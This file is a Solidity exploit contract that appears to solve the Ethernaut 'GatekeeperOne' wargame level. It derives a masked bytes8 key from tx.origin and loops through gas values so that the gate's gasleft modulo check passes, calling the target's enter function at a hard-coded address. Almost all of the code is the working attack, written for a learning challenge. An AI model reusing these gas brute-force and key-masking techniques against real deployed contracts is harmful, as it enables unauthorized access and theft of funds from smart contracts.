// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../src/GatekeeperOne.sol";
import {Script, console, console2} from "forge-std/Script.sol";

contract GatekeeperOne_exp{

    GatekeeperOne public gate;
    address public player;

    constructor() {

        gate = GatekeeperOne(0x769220B851421071cAb58d4786aE8C5a4a5726b7);
        player = address(tx.origin);
        console.log(player);
    }

    function attack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for (uint256 i = 0; i < 8191; i++) { 
            console.log(i);
            (bool result,)= address(gate).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                console2.logBool(result);
                break;
            }
        }
    }
}